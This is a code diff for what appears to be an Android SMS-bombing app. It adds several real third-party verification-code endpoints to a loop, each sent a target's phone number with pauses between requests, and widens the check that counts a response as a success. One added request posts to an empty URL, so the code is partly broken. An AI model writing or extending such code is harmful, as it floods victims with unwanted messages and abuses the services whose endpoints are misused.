@@ -10,6 +10,7 @@ import com.jiangyu.common.entity.EventCenter;
 import com.jiangyu.common.utils.CommonUtils;
 import com.jiangyu.common.utils.SharedPreferencesUtil;
 import com.jiangyu.common.utils.StringUtil;
+import com.jiangyu.common.utils.TimeUitls;
 import com.jiangyu.common.utils.ToastUtil;
 import com.lzy.okgo.OkGo;
 import com.lzy.okgo.callback.StringCallback;
@@ -42,6 +43,7 @@ public class MainActivity extends BaseActivity {
                     || response.body().contains("已发送")
                     || (response.body().contains("isError") && response.body().contains("false"))
                     || response.body().contains("ok")
+                    || response.body().contains("true")
                     || response.body().contains("Succeed")
                     || response.body().contains("succeed")
                     || response.body().contains("Success")
@@ -129,13 +131,18 @@ public class MainActivity extends BaseActivity {
                 Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                 OkGo.<String>post("http://api.qbaoting.com/v3.0.0/Passport/User/sendMobileCode?hash=34b0ed9ec277e226ebf263d06c9ee186&appid=50&deviceid=50973785a25a5494fe9dbe5847419032&time=1515492625&channel=x360").params("mobile", sphone).params("type", "1").tag(this).execute(callback);
                 Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
-                OkGo.<String>post("http://api2.gymboclub.com/?app=api&mod=Oauth&act=sendRegisterSMS").params("phone",sphone).tag(this).execute(callback);
+                OkGo.<String>post("http://api2.gymboclub.com/?app=api&mod=Oauth&act=sendRegisterSMS").params("phone", sphone).tag(this).execute(callback);
+                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
+                OkGo.<String>post("https://login.10086.cn/sendRandomCodeAction.action?type=01&channelID=12027&userName=" + sphone).tag(this).execute(callback);
+                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
+                OkGo.<String>get("https://portal.feiyucloud.com/sms/sendSms?districtCode=86&smsType=1&phoneNumber=" + sphone).tag(this).execute(callback);
+                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
+                OkGo.<String>get("https://www.51mjs.com/pc/index/getPhoneValCode?type=1&_=" + TimeUitls.date2LongString() + "&phone=" + sphone).tag(this).execute(callback);
                 Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
 
 
-                //test commit
-                //test commit
-                //test commit
+                OkGo.<String>post("" + sphone).tag(this).execute(callback);
+                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
 
 
                 if (--sloopCount > 0) {
